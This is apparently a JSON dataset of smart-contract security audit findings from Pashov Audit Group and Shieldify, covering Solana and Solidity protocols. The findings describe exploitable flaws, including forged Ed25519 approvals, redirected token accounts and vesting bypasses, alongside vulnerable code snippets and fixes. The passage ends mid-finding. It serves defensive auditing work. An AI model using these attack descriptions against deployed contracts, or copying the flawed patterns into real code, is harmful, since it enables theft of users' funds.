{
  "category": "Algo-Stables",
  "total_findings": 321,
  "fetched_at": "2026-01-29T13:14:03Z",
  "findings": [
    {
      "id": "63523",
      "title": "[L-04] Frontrunnable Initialization",
      "impact": "LOW",
      "content": "\n_Acknowledged_\n\nThe `initialize` instruction creates the global `fund_pool` PDA (`seed = b\"fund_pool\"`) and sets `initial_admin` to an arbitrary public key supplied by the caller. There is no access control restricting who may invoke this first-use initializer. An attacker can front-run deployment, initialize the pool, and seize control over all admin- and signer-gated operations for the lifetime of the program (until redeploy).\n\n**Recommendations**\n\nImplement a robust access control mechanism that ensures only a trusted entity, such as the program's deployer or a predefined address, can call the `initialize` function. This restriction can be enforced by verifying the caller's identity or using a specific signature during initialization.\n\n\n",
      "summary": "",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Enclave_2025-10-25",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Enclave-security-review_2025-10-25.md",
      "github_link": "",
      "tags": [
        "Auction",
        "Gas Limit",
        "ERC4626",
        "Initial Deposit",
        "Sense"
      ],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "63522",
      "title": "[L-03] Inconsistent usage of seed constants and byte literals",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nWhen checking the `fund_pool` address, the seeds used are inconsistent. Some places use the constant `FUND_POOL_SEED`, while others directly use the literal `b\"fund_pool\"`. \n```rust\n    #[account(\n        mut,\n        seeds = [b\"fund_pool\"],\n        bump = fund_pool.bump,\n        constraint = fund_pool.is_admin(&admin.key()) @ ErrorCode::Unauthorized\n    )]\n    pub fund_pool: Account<'info, FundPoolState>,\n\n    #[account(\n        seeds = [FUND_POOL_SEED],\n        bump = fund_pool.bump\n    )]\n    pub fund_pool: Account<'info, FundPoolState>,\n```\nAlthough both are currently equivalent, accidental modification to one of them during upgrades and maintenance may cause inconsistencies.\n\nIt is recommended to consistently use the `FUND_POOL_SEED` constant to improve maintainability and reduce risks introduced by upgrades.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Enclave_2025-10-25",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Enclave-security-review_2025-10-25.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "63521",
      "title": "[L-02] `borrow` lacks `has_one = user` constraint on `user_borrow_state`",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nThe `Borrow` accounts struct (`programs/solver-fund-pool-anchor/src/instructions/borrow.rs:109-128`) derives the user-specific state PDA with seeds `[USER_BORROW_SEED, user.key().as_ref()]`, but it never enforces that the stored `user` field inside `UserBorrowState` actually matches the `user` account provided in the instruction. If the account data is ever modified (e.g., via unchecked CPI or data corruption), the program will happily accept a mismatched tuple, causing the nonce owner stored on-chain to differ from the receiver used for token transfers and signature verification. This breaks critical assumptions about who owns the borrow nonce and can complicate replay protection or downstream accounting.\n\n**Recommendations**\nAdd `has_one = user` to the `user_borrow_state` account constraint so Anchor verifies the persisted `user` field matches the supplied `user` account, tightening the consistency checks around the PDA.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Enclave_2025-10-25",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Enclave-security-review_2025-10-25.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "63520",
      "title": "[L-01] Program does not support `Token-2022` mints",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nThe program exclusively imports and uses the legacy SPL Token interface:\n\n```rust\nuse anchor_spl::token::{self, Mint, Token, TokenAccount, Transfer};\npub token_program: Program<'info, Token>;\n```\n\nIf a Token-2022 mint (owned by `spl_token_2022::ID`) is passed, CPIs will fail because the runtime enforces the correct program ID for each account type.\n\n**Recommendations:**\n\nConsider switching to Anchor’s **token interface** layer, which is compatible with both SPL Token (legacy) and Token-2022 programs.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Enclave_2025-10-25",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Enclave-security-review_2025-10-25.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "63519",
      "title": "[C-02] Wrong‑Offset Ed25519 instruction introspection enables forged approvals",
      "impact": "HIGH",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\nThe program accepts off‑chain approvals by “verifying” an Ed25519 signature via the instruction sysvar: `borrow` expects the previous instruction in the same transaction to be a native Ed25519 verification and then inspects that instruction’s raw data to decide whether the signature is valid.\n\nHowever, the current verifier does not perform the essential validations that make this pattern sound:\n\n* It does not assert that the previous instruction’s `program_id` is the native Ed25519 program.\n* It does not enforce “inline mode” by requiring the three `*_instruction_index` fields in `Ed25519SignatureOffsets` to be `0xFFFF` (meaning use data from this very Ed25519 instruction).\n* It relies on reading specific byte ranges inside the Ed25519 instruction data, but does not validate that the supplied offsets and sizes actually point to those ranges.\n\nOn Solana, the Ed25519 verifier is flexible: the instruction can specify offsets and instruction indexes for where to read the signature, public key, and message. If a contract does not validate those fields, an attacker can craft a preceding instruction that causes the Ed25519 program to verify a signature over attacker‑controlled data, while placing benign‑looking bytes (the expected signer pubkey, message hash, signature) at the locations your program later checks. Your verifier will then return success even though no signature from an authorized signer was actually validated.\n\nAs a result, any caller can submit a transaction that includes a maliciously constructed “verification” instruction immediately before `borrow` and have the program accept it as valid. That enables unauthorized borrows from the pool and increments the user’s nonce, potentially blocking the legitimate user from later redeeming a genuine approval.\n\n## Recommendations\n\nHarden the Ed25519 verification to treat the previous instruction as valid evidence only if all of the following are true:\n\n* The previous instruction’s `program_id` is the native Ed25519 program.\n* The instruction encodes exactly one signature and carries no auxiliary accounts.\n* All three `*_instruction_index` fields in `Ed25519SignatureOffsets` are `0xFFFF` (inline mode), so the signature, public key, and message are taken from the same Ed25519 instruction.\n* All offsets and sizes are bounds‑checked against the instruction data length before slicing.\n* The inline public key, message, and signature bytes exactly match the expected authorized signer and message.\n* If `borrow` is the first instruction, reject (there is no “previous” verification to inspect).\n\n\n\n",
      "summary": "\nThe report discusses a bug found in a program that accepts off-chain approvals by verifying an Ed25519 signature. The current verifier does not perform essential validations, allowing attackers to craft preceding instructions that cause the program to accept invalid signatures. This can result in unauthorized borrows from the pool and block legitimate users from redeeming their approvals. The recommendation is to harden the verification process by checking the previous instruction's program ID, only allowing one signature and no auxiliary accounts, using inline mode, and checking for matching public key, message, and signature.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Enclave_2025-10-25",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Enclave-security-review_2025-10-25.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "63518",
      "title": "[C-01] Funds can be redirected",
      "impact": "HIGH",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\n```rust\n #[account(mut)]\n    pub user_token_account: Account<'info, TokenAccount>\n```\n\nIn `programs/solver-fund-pool-anchor/src/instructions/borrow.rs:142-143`, the `user_token_account` is only required to be writable; the program never checks whether `owner == user.key()`. The signed message also omits the `user_token_account`, and the contract does not validate that `user_token_account.owner` equals `user`, nor that it is the user’s associated token account (ATA).\n\nAs a result, an attacker can obtain a legitimate signature (which only binds `user/mint/amount/time window/nonce/...`) but replace `user_token_account` with their own token account, siphoning pool funds directly to themselves.\n\n## Recommendations\n\n```rust\n#[account(\n    mut,\n    constraint = user_token_account.mint == token_mint.key() @ ErrorCode::InvalidTokenAccountMint,\n    constraint = user_token_account.owner == user.key() @ ErrorCode::InvalidTokenAccountOwner,\n)]\npub user_token_account: Account<'info, TokenAccount>,\n```\n\nOr restrict to the user’s ATA:\n\n```rust\nuse anchor_spl::associated_token::get_associated_token_address;\nrequire_keys_eq!(\n    user_token_account.key(),\n    get_associated_token_address(&Pubkey::try_from(user.key())?, &token_mint.key()),\n    ErrorCode::NotUserATA\n);\n```\n\n\n\n",
      "summary": "\nThis bug report describes a problem with a Rust program that can allow an attacker to steal funds from a pool. The program does not properly check the ownership of a user's token account, which means that an attacker can use a legitimate signature to siphon funds directly to themselves. The report recommends adding code to validate the token account and restrict it to the user's associated token account. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Enclave_2025-10-25",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Enclave-security-review_2025-10-25.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "63470",
      "title": "[L-03] Merkle Root Is Mutable Mid-Airdrop",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe owner can change `merkleRoot` at any time. Already-registered users remain unaffected (state stored), but future registrations switch to the new root, which can change eligibility without warning.\n\n## Location of Affected Code\n\nFile: [src/S2Airdrop.sol#L160-L163](https://github.com/SlothFi/s2-airdrop/blob/fa331efe0bc68794537d6df645241f61be14be7b/src/S2Airdrop.sol#L160-L163)\n\n```solidity\nfunction setMerkleRoot(bytes32 root) public onlyOwner {\n    merkleRoot = root;\n    emit MerkleRootSet(root);\n}\n```\n\n## Impact\n\nTrust/governance risk: operator can exclude/replace users mid-campaign; users and integrators cannot assume a stable eligibility set after launch.\n\n## Recommendation\n\nFreeze the root after a start time, or gate changes behind a timelock/multisig and communicate immutability guarantees. Optionally add a phase ID and store it to make root changes explicit on-chain.\n\n## Team Response\n\nAcknowledged.\n\n## [I-01] Hardcoded Token Address Limits Deployment To A Specific Chain\n\n## Severity\n\nInformational Risk\n\n## Description\n\nThe contract uses a hardcoded token address `0x133879524DDb38582cf0b93D10aDB789601Ff397` as a constant, which corresponds to the BORNE ERC-20 token on [Avalanche mainnet](https://avascan.info/blockchain/c/token/0x133879524DDb38582cf0b93D10aDB789601Ff397). This implementation prevents the contract from being deployed on other blockchain networks where the BORNE token exists at different addresses.\n\nFor example, the BORNE token address on Abstract chain is [`0xcfd7cfeacc783a0d48ce076922b9d87aab2c4c1b`](https://abscan.org/token/0xcfd7cfeacc783a0d48ce076922b9d87aab2c4c1b), making the current contract incompatible with that network without modifying the contract code.\n\n## Location of Affected Code\n\nFile: [src/S2Airdrop.sol#L93](https://github.com/SlothFi/s2-airdrop/blob/fa331efe0bc68794537d6df645241f61be14be7b/src/S2Airdrop.sol#L93)\n\n```solidity\naddress private constant TOKEN = address(0x133879524DDb38582cf0b93D10aDB789601Ff397);\n```\n\n## Impact\n\nThe hardcoded token address restricts deployment flexibility and requires separate contract implementations for each blockchain network. However, this configuration is acceptable if the protocol plans to deploy exclusively on the Avalanche mainnet.\n\n## Recommendation\n\nMake the token address configurable by setting it in the constructor as an immutable variable.\n\n## Team Response\n\nAcknowledged.\n\n## [I-02] No Recovery Path for non-`TOKEN` ERC-20s Sent to the Contract\n\n## Severity\n\nInformational Risk\n\n## Description\n\nThe `withdrawTokens()` only transfers the hardcoded `TOKEN`. Any other ERC-20 sent by mistake is stuck forever; there’s no generic sweep/recovery.\n\n## Location of Affected Code\n\nFile: [src/S2Airdrop.sol#L276-L278](https://github.com/SlothFi/s2-airdrop/blob/fa331efe0bc68794537d6df645241f61be14be7b/src/S2Airdrop.sol#L276-L278)\n\n```solidity\naddress private constant TOKEN = 0x1338...f397; // Only this token can be withdrawn:\n\nfunction withdrawTokens(address to, uint256 amount) public onlyOwner {\n    SafeTransferLib.safeTransfer(TOKEN, to, amount);\n}\n```\n\n## Impact\n\nPermanent loss of mistakenly sent assets (common operational error during integrations / manual ops).\n\n## Recommendation\n\nAdd an owner-only `recoverERC20(address token, address to, uint256 amount)` guarded by appropriate policy (and events). Keep `TOKEN` logic unchanged for airdrop flows.\n\n## Team Response\n\nAcknowledged.\n\n## [I-03] Missing Dedicated Event for Owner Withdrawals (Monitoring Blind Spot)\n\n## Severity\n\nInformational Risk\n\n## Description\n\nOwner withdrawals emit only the ERC-20 `Transfer` event. There’s no contract-level event to reliably monitor admin outflows.\n\n## Location of Affected Code\n\nFile: [src/S2Airdrop.sol#L276-L278](https://github.com/SlothFi/s2-airdrop/blob/fa331efe0bc68794537d6df645241f61be14be7b/src/S2Airdrop.sol#L276-L278)\n\n```solidity\nfunction withdrawTokens(address to, uint256 amount) public onlyOwner {\n    SafeTransferLib.safeTransfer(TOKEN, to, amount); // no event\n}\n```\n\n## Recommendation\n\nEmit `event TokensWithdrawn(address indexed to, uint256 amount);` inside `withdrawTokens()` and use it for monitoring and forensics.\n\n## Team Response\n\nAcknowledged.\n\n",
      "summary": "",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Spellborne S2Airdrop",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Spellborne-S2Airdrop-Security-Review.md",
      "github_link": "",
      "tags": [
        "0x"
      ],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63469",
      "title": "[L-02] Users Can Bypass Vesting During Initialization",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe contract is deployed in an unpaused state by default, with `pausedFlag` initialized to `0` and vesting times (`startTime` and `endTime`) initialized to `0`. This creates a vulnerability window during deployment where users who possess valid Merkle proofs can register and immediately claim their full allocation before vesting parameters are properly configured.\n\nThe typical initialization sequence, as can be seen in `test/S2Airdrop.t.sol`:\n\n1. Deploy the contract (unpaused by default)\n2. Call `setMerkleRoot()` to configure eligible addresses\n3. Call `setTime()` to establish vesting parameters\n\nAfter step 2 completes but before step 3 is executed, users can exploit this window to bypass vesting entirely. The `_vestedAmount()` function returns the full allocation when `startTime` is `0`:\n\n```solidity\nif (block.timestamp < startTime) return 0;\n```\n\nSince `block.timestamp` is never less than `0`, this condition fails, and with `endTime` also being `0`, the function proceeds to calculate vested amounts incorrectly or returns unintended values.\n\n## Location of Affected Code\n\nFile: [src/S2Airdrop.sol#L122-L128](https://github.com/SlothFi/s2-airdrop/blob/fa331efe0bc68794537d6df645241f61be14be7b/src/S2Airdrop.sol#L122-L128)\n\n```solidity\nconstructor(address _owner, address _treasuryWallet) {\n    if (_owner == address(0) || _treasuryWallet == address(0)) {\n        revert ZeroAddress();\n    }\n    _initializeOwner(_owner);\n    treasuryWallet = _treasuryWallet;\n}\n```\n\nFile: [src/S2Airdrop.sol#L285-L301](https://github.com/SlothFi/s2-airdrop/blob/fa331efe0bc68794537d6df645241f61be14be7b/src/S2Airdrop.sol#L285-L301)\n\n```solidity\nfunction _vestedAmount(address user) internal view returns (uint256) {\n    Airdrop memory details = airdropDetails[user];\n\n    if (block.timestamp < startTime) return 0;\n\n    uint256 leftVestedAmount = details.vestedAmount - details.spendLockedAmount;\n\n    if (block.timestamp >= endTime) return leftVestedAmount;\n\n    uint256 elapsed = block.timestamp - startTime;\n    uint256 duration = endTime - startTime;\n\n    return (leftVestedAmount * elapsed) / duration;\n}\n```\n\n## Impact\n\nUsers who obtain Merkle proofs (legitimately or through information leakage) can register and claim their entire token allocation immediately upon Merkle root deployment, completely bypassing the intended vesting mechanism. However, the likelihood of users obtaining valid Merkle proofs before initialization is complete is very low, as proofs are typically distributed after the contract is fully configured. This low likelihood is the primary reason this issue is rated as Low Risk.\n\nDespite the low probability, exploitation could result in:\n\n1. Premature distribution of tokens meant to vest over time\n2. Loss of control over the token release schedule\n3. Potential market impact from unexpected token circulation\n4. Unfair advantage for users monitoring the mempool who can front-run initialization transactions\n\n## Recommendation\n\n1. Deploy the contract in a paused state by initializing `pausedFlag = 1` in the constructor:\n\n```solidity\nconstructor(address _owner, address _treasuryWallet) {\n    if (_owner == address(0) || _treasuryWallet == address(0)) {\n        revert ZeroAddress();\n    }\n    _initializeOwner(_owner);\n    treasuryWallet = _treasuryWallet;\n    pausedFlag = 1;\n}\n```\n\n2. Add validation checks for zero timestamps in both `claim()` and `_vestedAmount()` functions:\n\n```solidity\nfunction _vestedAmount(address user) internal view returns (uint256) {\n    if (startTime == 0 || endTime == 0) return 0;\n\n    Airdrop memory details = airdropDetails[user];\n\n    if (block.timestamp < startTime) return 0;\n\n    uint256 leftVestedAmount = details.vestedAmount - details.spendLockedAmount;\n\n    if (block.timestamp >= endTime) return leftVestedAmount;\n\n    uint256 elapsed = block.timestamp - startTime;\n    uint256 duration = endTime - startTime;\n\n    return (leftVestedAmount * elapsed) / duration;\n}\n```\n\n3. Follow a secure initialization sequence:\n   - Deploy contract (automatically paused)\n   - Set vesting times\n   - Set merkle root\n   - Fund the contract\n   - Unpause to enable user interactions\n\n## Team Response\n\nAcknowledged.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Spellborne S2Airdrop",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Spellborne-S2Airdrop-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63468",
      "title": "[L-01] Vesting Parameters Can Be Changed After Vesting Starts",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe `setTime()` function only validates that the new `_startTime` is in the future, but does not check whether vesting has already commenced with the current stored `startTime`. This allows the owner to modify vesting parameters after users have already begun claiming tokens, potentially disrupting user expectations and previously calculated vesting schedules.\n\nThe validation in the function checks:\n\n```solidity\nif (block.timestamp > _startTime) revert VestingAlreadyStarted();\n```\n\nHowever, this only prevents setting a `_startTime` that is already in the past. If the current `startTime` has already passed and vesting is active, the owner can still call `setTime()` with a future timestamp, effectively restarting or extending the vesting period.\n\n## Location of Affected Code\n\nFile: [src/S2Airdrop.sol#L166-L174](https://github.com/SlothFi/s2-airdrop/blob/fa331efe0bc68794537d6df645241f61be14be7b/src/S2Airdrop.sol#L166-L174)\n\n```solidity\nfunction setTime(uint40 _startTime, uint40 _endTime) public onlyOwner {\n    if (block.timestamp > _startTime) revert VestingAlreadyStarted();\n    if (_startTime >= _endTime) revert VestingEndTimeError();\n\n    startTime = _startTime;\n    endTime = _endTime;\n\n    emit VestingTimeSet(_startTime, _endTime);\n}\n```\n\n## Impact\n\nThe owner can change vesting parameters after vesting has started, leading to:\n\n1. Users who have calculated their vesting schedule based on the original parameters may find their claimable amounts suddenly reduced or locked again\n2. The vesting period can be extended arbitrarily, delaying when users receive their full allocation\n3. Trust in the protocol is undermined if vesting parameters are modified post-deployment without user consent\n\n## Recommendation\n\nAdd a check to ensure the current `startTime` has not yet been reached:\n\n```solidity\nfunction setTime(uint40 _startTime, uint40 _endTime) public onlyOwner {\n    if (block.timestamp > startTime) revert VestingAlreadyStarted();\n    if (block.timestamp > _startTime) revert VestingAlreadyStarted();\n    if (_startTime >= _endTime) revert VestingEndTimeError();\n\n    startTime = _startTime;\n    endTime = _endTime;\n\n    emit VestingTimeSet(_startTime, _endTime);\n}\n```\n\n## Team Response\n\nAcknowledged.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Spellborne S2Airdrop",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Spellborne-S2Airdrop-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63467",
      "title": "[M-01] Unfair Vesting Extension for Users Spending Locked Tokens Before Claiming",
      "impact": "MEDIUM",
      "content": "\n## Severity\n\nMedium Risk\n\n## Description\n\nThe vesting calculation in `_vestedAmount()` creates an inequitable outcome for users who spend locked tokens before claiming vested tokens compared to users who claim first. The function reduces the total allocation by `spendLockedAmount` before applying the vesting percentage, effectively extending the vesting period for users who utilize the in-app purchase feature early.\n\nWhen a user spends locked tokens via `spendLockTokens()`, the `spendLockedAmount` is incremented. Subsequently, `_vestedAmount()` calculates the vested amount as:\n\n```solidity\nuint256 leftVestedAmount = details.vestedAmount - details.spendLockedAmount;\nreturn (leftVestedAmount * elapsed) / duration;\n```\n\nThis means the vesting percentage is applied to the reduced allocation rather than the original amount, penalizing users who spend locked tokens before the vesting period completes.\n\n## Location of Affected Code\n\nFile: [src/S2Airdrop.sol#L285-L301](https://github.com/SlothFi/s2-airdrop/blob/fa331efe0bc68794537d6df645241f61be14be7b/src/S2Airdrop.sol#L285-L301)\n\n```solidity\nfunction _vestedAmount(address user) internal view returns (uint256) {\n    Airdrop memory details = airdropDetails[user];\n\n    if (block.timestamp < startTime) return 0;\n\n    uint256 leftVestedAmount = details.vestedAmount - details.spendLockedAmount;\n\n    if (block.timestamp >= endTime) return leftVestedAmount;\n\n    uint256 elapsed = block.timestamp - startTime;\n    uint256 duration = endTime - startTime;\n\n    return (leftVestedAmount * elapsed) / duration;\n}\n```\n\n## Impact\n\nUsers who spend locked tokens before claiming face a significant disadvantage: their claimable vested amount is calculated on a reduced base, resulting in fewer tokens available for withdrawal at any given point during vesting. Conversely, users who claim vested tokens first can then spend the same amount of locked tokens while retaining their full vested allocation.\n\nThis creates an unfair system where identical users with identical allocations receive different treatment based solely on the order of their interactions with the contract.\n\n## Proof of Concept\n\nBoth User A and User B have 10,000 tokens allocated, with 3 months of vesting passed (50% vested).\n\n**User A (claims first):**\n\n1. Claims 5,000 vested tokens (50% of 10,000)\n   - `details.claimedAmount = 5,000`\n2. Spends 5,000 locked tokens via in-app purchase\n   - `details.spendLockedAmount = 5,000`\n   - Successfully completes the purchase\n\n**User B (spends first):**\n\n1. Spends 5,000 locked tokens via in-app purchase\n   - `details.spendLockedAmount = 5,000`\n2. Attempts to claim 5,000 vested tokens (50% of original 10,000)\n   - `leftVestedAmount = 10,000 - 5,000 = 5,000`\n   - `_vestedAmount = 5,000 * 50% = 2,500`\n   - `availableAmount = 2,500 - 0 = 2,500`\n   - Can only claim 2,500 tokens instead of the expected 5,000\n\nUser B receives 2,500 fewer claimable tokens for the same allocation and timeline simply because they utilized the in-app purchase feature before claiming.\n\n## Recommendation\n\nCalculate the vested amount based on the original allocation first, then subtract spent locked tokens. Alternatively, if the vesting schedule extension is intentional, automatically claim the user's vested tokens before purchase calculations.\n\n## Team Response\n\nFixed.\n\n",
      "summary": "\nThe report discusses a bug in the calculation of vested tokens for users in a smart contract. This bug is classified as a medium risk and has an impact on users who spend locked tokens before claiming their vested tokens. The calculation reduces the total allocation by the amount spent, resulting in a longer vesting period for these users compared to others who claim first. The affected code is located in a specific file and function in the contract. The bug has been demonstrated with two users who have the same allocation but receive different amounts of claimable tokens due to the order of their interactions with the contract. The recommendation is to either calculate the vested amount based on the original allocation or automatically claim vested tokens before purchase calculations. The team has responded that the bug has been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Spellborne S2Airdrop",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Spellborne-S2Airdrop-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "63044",
      "title": "[L-08] No Way to Recover Locked Tokens in the Vault",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe vault lacks a mechanism to recover arbitrary ERC-20 tokens accidentally sent to it. Over time, stray tokens may become irrecoverable. For example the vault expects ETH and later swaps `ETH`->`HEROSTR`. If a sale is settled in WETH (very common) and the marketplace transfers WETH (ERC-20) to the vault, it just sits there. The contract has no WETH unwrap and no generic ERC-20 withdrawal.\n\n## Location of Affected Code\n\nFile: [NFTVault%20Final.sol](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/NFTVault%20Final.sol)\n\n## Impact\n\nLocked tokens\n\n## Recommendation\n\nAdd a simple, restricted rescue function:\n\n```solidity\nfunction rescueTokens(address token, uint256 amount, address to) external onlyController nonReentrant {\n    require(token != HEROSTR, \"cannot rescue HEROSTR\");\n    IERC20(token).transfer(to, amount);\n}\n```\n\n## Team Response\n\n**Status: FIXED**\n\nWhile the vault's normal operation only involves ETH and OCH NFTs, we have implemented a basic token recovery function for edge cases where tokens might get accidentally sent to the vault (such as WETH from marketplace settlements).\n\n**Implementation:**\n\n```solidity\nfunction rescueTokens(address token, uint256 amount, address to) external onlyController nonReentrant {\n    require(token != HEROSTR, \"cannot rescue HEROSTR\");\n    IERC20(token).transfer(to, amount);\n}\n```\n\n## [I-01] Enforse Constraints for `swapThreshold` and `maxSwapAmount` in `setSwapBehavior()` Function\n\n## Severity\n\nInformational Risk\n\n## Description\n\nOwner can set `swapThreshold` and `maxSwapAmount` via `setSwapBehavior()` to arbitrary values (no upper/lower bounds), while elsewhere `setSwapThreshold()` has a safe cap.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L623-L633](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L623-L633)\n\n```solidity\nfunction setSwapBehavior(bool _enabled, bool _lastOnly, uint256 _threshold, uint256 _max) external onlyOwner {\n    swapEnabled = _enabled;\n    swapLastTaxOnly = _lastOnly;\n    swapThreshold = _threshold;\n    maxSwapAmount = _max;\n}\n```\n\n## Recommendation\n\nAdd sanity checks similar to `setSwapThreshold()` (e.g., `_threshold <= totalSupply()/100` and `_max <= totalSupply()/100`).\n\n## Team Response\n\n**Status: FIXED**\n\nWe have implemented sanity checks for swap parameters to prevent misconfiguration:\n\n**Implementation:**\n\n```solidity\nfunction setSwapBehavior(bool _enabled, bool _lastOnly, uint256 _threshold, uint256 _max) external onlyOwner {\n    require(_threshold <= totalSupply() / 100, \"threshold too high\");\n    require(_max <= totalSupply() / 100, \"max amount too high\");\n    require(_threshold > 0, \"threshold must be > 0\");\n    require(_max >= _threshold, \"max must be >= threshold\");\n\n    swapEnabled = _enabled;\n    swapLastTaxOnly = _lastOnly;\n    swapThreshold = _threshold;\n    maxSwapAmount = _max;\n}\n```\n\n## [I-02] Newly Set Recipients Are Not Auto-(Un)Exempted\n\n## Severity\n\nInformational Risk\n\n## Description\n\nThe `setRecipients()` replaces the vault/accumulator/team addresses but does not update `isTaxExempt()`/`isCapExempt()`. Newly set recipients may unexpectedly be taxed or restricted, while the previous recipients remain exempt unless the owner manually updates exemptions.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L659-L671](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L659-L671)\n\n```solidity\nfunction setRecipients( address _vault, address _accumulator, address _team ) external onlyOwner {\n    if (_vault == address(0)) revert ZeroAddress();\n    if (_accumulator == address(0)) revert ZeroAddress();\n    if (_team == address(0)) revert ZeroAddress();\n\n    nftVault = _vault;\n    pdgystrAccumulator = _accumulator;\n    teamWallet = _team;\n}\n```\n\n## Impact\n\n- Newly set recipients may be taxed or subject to cap restrictions despite the intended exemption policy.\n- Previous recipients remain exempt and could receive preferential treatment unintentionally until manually updated.\n\n## Recommendation\n\nUpdate `setRecipients()` to atomically (un)exempt old and new recipients, e.g.:\n\n- Clear exemptions for old `nftVault/pdgystrAccumulator/teamWallet`.\n- Set exemptions for new `_vault/_accumulator/_team`.\n\n## Team Response\n\n**Status: ACKNOWLEDGED - ACCEPTABLE RISK**\n\nThe team acknowledges this behavior. Given that recipient changes are rare administrative actions, manual exemption management provides more explicit control over tax and cap exemptions. This approach allows for intentional review of exemption status when recipients are updated.\n\n## [I-03] Max Wallet Enforced Only on Buys and Can Be Trivially Bypassed via Peer Transfers\n\n## Severity\n\nInformational Risk\n\n## Description\n\nThe max wallet check is applied only on buy transfers. Direct peer-to-peer transfers to a holder are not subject to this check, allowing users to exceed the configured max wallet via incoming transfers.\n\n## Location of Affected Code\n\nFile: [HEROSTR.sol#L434-L439](https://github.com/0xcaptainy/HEROSTR/blob/cafe69ed029aef74e874471b157afabfacb0d81c/HEROSTR.sol#L434-L439)\n\n```solidity\nfunction _update( address from, address to, uint256 amount ) internal override {\n  // code\n  // Check max wallet after tax\n  if (maxWalletEnabled && isBuy && !isCapExempt[to]) {\n      uint256 maxWallet = (totalSupply() * maxWalletBps) / BPS;\n      if (balanceOf(to) > maxWallet) {\n          revert ExceedsMaxWallet();\n      }\n  }\n  // code\n}\n```\n\n## Impact\n\n- Users can bypass max wallet by receiving tokens via direct transfers.\n- Without a whitelist mechanism, the number of wallets is effectively unlimited, reducing the practical value of the max wallet feature for distribution control.\n\n## Proof of Concept\n\n1. A single user controls two wallets: Wallet A and Wallet B.\n2. The user buys up to the max wallet limit into Wallet A.\n3. The user buys up to the max wallet limit into Wallet B.\n4. The user transfers tokens from Wallet B to Wallet A via a direct peer transfer.\n5. Because the max wallet check runs only on buys, the transfer to Wallet A is not checked, Wallet A now holds more than the configured max wallet (effectively up to 2× the limit in this example).\n\n## Recommendation\n\nEnforce max wallet on all incoming transfers (buys and peer transfers).\n\n## Team Response\n\n**Status: ACKNOWLEDGED - BY DESIGN**\n\nThe current implementation focusing on buy transactions is intentional. Max wallet limits are primarily designed to prevent large single purchases during launch, not to restrict peer-to-peer transfers. Enforcing limits on all transfers would create user experience friction without significant security benefits, as determined users can always use multiple wallets.\n\n## [I-04] Swap Deadline Computed at Execution Always Passes\n\n## Severity\n\nInformational Risk\n\n## Description\n\nThe deadline is set as `block.timestamp + 600` at execution time inside the vault. Since the router validates 